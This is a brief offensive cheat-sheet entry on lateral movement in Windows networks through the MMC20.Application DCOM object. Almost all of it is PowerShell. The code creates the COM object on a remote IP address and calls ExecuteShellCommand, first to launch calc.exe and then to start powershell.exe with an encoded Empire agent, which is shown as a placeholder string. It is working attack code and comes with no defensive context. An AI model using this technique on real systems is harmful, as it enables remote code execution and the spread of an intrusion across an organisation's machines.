
# Lateral Movement in Windows environment using MMC


    "
     $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","IPAddress"))
     $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe",$null,$null,7)
     $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",$null,"-enc DFDFSFSFSFSFSFSFSDFSFSF < Empire encoded string > ","7")
    "
